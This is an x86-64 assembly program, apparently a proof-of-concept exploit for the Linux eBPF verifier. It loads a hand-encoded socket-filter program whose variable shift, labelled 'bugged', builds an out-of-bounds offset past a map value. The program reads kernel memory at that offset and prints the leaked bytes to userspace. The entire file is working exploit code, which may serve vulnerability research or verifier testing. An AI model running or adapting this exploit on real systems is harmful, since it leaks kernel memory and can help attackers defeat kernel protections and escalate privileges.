.intel_syntax noprefix
.section .text
.global _start

.equ SYS_write, 1
.equ SYS_exit, 60
.equ SYS_socketpair, 53
.equ SYS_setsockopt, 54
.equ SYS_bpf, 321

.equ AF_UNIX, 1
.equ SOCK_DGRAM, 2
.equ SOL_SOCKET, 1
.equ SO_ATTACH_BPF, 50

.equ BPF_MAP_CREATE, 0
.equ BPF_MAP_LOOKUP_ELEM, 1
.equ BPF_PROG_LOAD, 5

.equ BPF_MAP_TYPE_ARRAY, 2
.equ BPF_PROG_TYPE_SOCKET_FILTER, 1

.equ LOG_BUF_SIZE, 0x10000
.equ MAP_VALUE_SIZE, 0x100

_start:
	# bpf(map_create)
	lea rbx, [rip + attr]
	xor eax, eax
	mov ecx, 0x200/8
1:
	mov qword ptr [rbx + rax*8], 0
	inc eax
	cmp eax, ecx
	jne 1b

	# attr.map_type = ARRAY
	mov dword ptr [rbx + 0x00], BPF_MAP_TYPE_ARRAY
	# attr.key_size = 4
	mov dword ptr [rbx + 0x04], 4
	# attr.value_size = MAP_VALUE_SIZE
	mov dword ptr [rbx + 0x08], MAP_VALUE_SIZE
	# attr.max_entries = 1
	mov dword ptr [rbx + 0x0c], 1

	mov eax, SYS_bpf
	mov edi, BPF_MAP_CREATE
	mov rsi, rbx
	mov edx, 0x200
	syscall
	test eax, eax
	js fail
	mov dword ptr [rip + map_fd], eax

	# socketpair(AF_UNIX, SOCK_DGRAM, 0, fds)
	mov eax, SYS_socketpair
	mov edi, AF_UNIX
	mov esi, SOCK_DGRAM
	xor edx, edx
	lea r10, [rip + fds]
	syscall
	test eax, eax
	js fail

	# patch map fd into LD_IMM64 insn
	mov eax, dword ptr [rip + map_fd]
	mov dword ptr [rip + bpf_insns + 36], eax

	# bpf(prog_load)
	lea rbx, [rip + attr]
	xor eax, eax
	mov ecx, 0x200/8
2:
	mov qword ptr [rbx + rax*8], 0
	inc eax
	cmp eax, ecx
	jne 2b

	# attr.prog_type = SOCKET_FILTER
	mov dword ptr [rbx + 0x00], BPF_PROG_TYPE_SOCKET_FILTER
	# attr.insn_cnt
	mov dword ptr [rbx + 0x04], (bpf_insns_end - bpf_insns) / 8
	# attr.insns (u64)
	lea rax, [rip + bpf_insns]
	mov qword ptr [rbx + 0x08], rax
	# attr.license (u64)
	lea rax, [rip + license]
	mov qword ptr [rbx + 0x10], rax
	# attr.log_level
	mov dword ptr [rbx + 0x18], 1
	# attr.log_size
	mov dword ptr [rbx + 0x1c], LOG_BUF_SIZE
	# attr.log_buf (u64)
	lea rax, [rip + log_buf]
	mov qword ptr [rbx + 0x20], rax

	mov eax, SYS_bpf
	mov edi, BPF_PROG_LOAD
	mov rsi, rbx
	mov edx, 0x200
	syscall
	test eax, eax
	jns 4f
	mov dword ptr [rip + prog_err], eax
	jmp prog_fail
4:
	mov dword ptr [rip + prog_fd], eax

	# setsockopt(fds[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, 4)
	mov eax, SYS_setsockopt
	mov edi, dword ptr [rip + fds + 4]
	mov esi, SOL_SOCKET
	mov edx, SO_ATTACH_BPF
	lea r10, [rip + prog_fd]
	mov r8d, 4
	syscall
	test eax, eax
	js fail

	# trigger: write 16B packet to fds[0]
	mov eax, SYS_write
	mov edi, dword ptr [rip + fds + 0]
	lea rsi, [rip + pkt]
	mov edx, 16
	syscall

	# bpf(map_lookup_elem) to fetch map[0] into outbuf
	lea rbx, [rip + attr]
	xor eax, eax
	mov ecx, 0x200/8
3:
	mov qword ptr [rbx + rax*8], 0
	inc eax
	cmp eax, ecx
	jne 3b

	mov eax, dword ptr [rip + map_fd]
	mov dword ptr [rbx + 0x00], eax
	lea rax, [rip + key0]
	mov qword ptr [rbx + 0x08], rax
	lea rax, [rip + outbuf]
	mov qword ptr [rbx + 0x10], rax

	mov eax, SYS_bpf
	mov edi, BPF_MAP_LOOKUP_ELEM
	mov rsi, rbx
	mov edx, 0x200
	syscall
	test eax, eax
	js fail

	# print first 8 bytes of outbuf as hex
	mov rax, qword ptr [rip + outbuf]
	lea rdi, [rip + hexbuf]
	call u64_to_hex_nl
	mov eax, SYS_write
	mov edi, 1
	lea rsi, [rip + hexbuf]
	mov edx, 17
	syscall

	mov eax, SYS_exit
	xor edi, edi
	syscall

prog_fail:
	# dump error + verifier log and exit
	mov eax, SYS_write
	mov edi, 1
	lea rsi, [rip + msg_prog_fail]
	mov edx, msg_prog_fail_end - msg_prog_fail
	syscall

	mov eax, dword ptr [rip + prog_err]
	cdqe
	lea rdi, [rip + hexbuf]
	call u64_to_hex_nl
	mov eax, SYS_write
	mov edi, 1
	lea rsi, [rip + hexbuf]
	mov edx, 17
	syscall

	mov eax, SYS_write
	mov edi, 1
	lea rsi, [rip + log_buf]
	mov edx, 4096
	syscall
fail:
	mov eax, SYS_exit
	mov edi, 1
	syscall

# rax = value, rdi = dst (>=17 bytes)
u64_to_hex_nl:
	push rbp
	mov rbp, rsp
	push rbx
	mov rbx, rax
	mov rcx, 16
4:
	mov rax, rbx
	and rax, 0xf
	cmp al, 10
	jb 5f
	add al, 'a' - 10
	jmp 6f
5:
	add al, '0'
6:
	mov byte ptr [rdi + rcx - 1], al
	shr rbx, 4
	dec rcx
	jnz 4b
	mov byte ptr [rdi + 16], 0x0a
	pop rbx
	pop rbp
	ret

.section .data
license:
	.ascii "GPL\\0"

key0:
	.long 0

pkt:
	# byte0 = shift exponent (8 => offset 0x100), byte1 = include (1)
	.byte 8, 1
	.zero 14

hexbuf:
	.zero 17

map_fd:
	.long 0
prog_fd:
	.long 0
prog_err:
	.long 0
fds:
	.long 0, 0

msg_prog_fail:
	.ascii "prog_load failed, err=\n"
msg_prog_fail_end:

# eBPF program (socket filter)
# leaks *(u64*)(map_value + (1 << (pkt[0] & 0x3f)) * (pkt[1] & 1)) into map_value[0:8]
.align 8
bpf_insns:
	# r6 = r1
	.quad 0x00000000000016bf
	# *(u32 *)(r10 - 4) = 0
	.quad 0x00000000fffc0a62
	# r2 = r10
	.quad 0x000000000000a2bf
	# r2 += -4
	.quad 0xfffffffc00000207
	# r1 = map_fd (pseudo) -- patched at runtime
	.quad 0x0000000000001118
	.quad 0x0000000000000000
	# call map_lookup_elem
	.quad 0x0000000100000085
	# if r0 == 0 goto exit (+20)
	.quad 0x0000000000140015
	# r7 = r0
	.quad 0x00000000000007bf
	# r1 = r6 (ctx)
	.quad 0x00000000000061bf
	# r2 = 0
	.quad 0x00000000000002b7
	# r3 = r10
	.quad 0x000000000000a3bf
	# r3 += -64
	.quad 0xffffffc000000307
	# r4 = 16
	.quad 0x00000010000004b7
	# call skb_load_bytes (26)
	.quad 0x0000001a00000085
	# if r0 != 0 goto exit_set_r0_0 (+11)
	.quad 0x00000000000b0055
	# r2 = *(u8 *)(r10 - 64)
	.quad 0x00000000ffc0a271
	# r2 &= 0x3f
	.quad 0x0000003f00000257
	# r3 = *(u8 *)(r10 - 63)
	.quad 0x00000000ffc1a371
	# r3 &= 1
	.quad 0x0000000100000357
	# r4 = 1
	.quad 0x00000001000004b7
	# r4 <<= r2   (bugged var shift)
	.quad 0x000000000000246f
	# r4 *= r3
	.quad 0x000000000000342f
	# r8 = r7
	.quad 0x00000000000078bf
	# r8 += r4
	.quad 0x000000000000480f
	# r9 = *(u64 *)(r8 + 0)
	.quad 0x0000000000008979
	# *(u64 *)(r7 + 0) = r9
	.quad 0x000000000000977b
exit_set_r0_0:
	# r0 = 0
	.quad 0x00000000000000b7
	# exit
	.quad 0x0000000000000095
bpf_insns_end:

.section .bss
.align 8
attr:
	.zero 0x200
log_buf:
	.zero LOG_BUF_SIZE
outbuf:
	.zero MAP_VALUE_SIZE
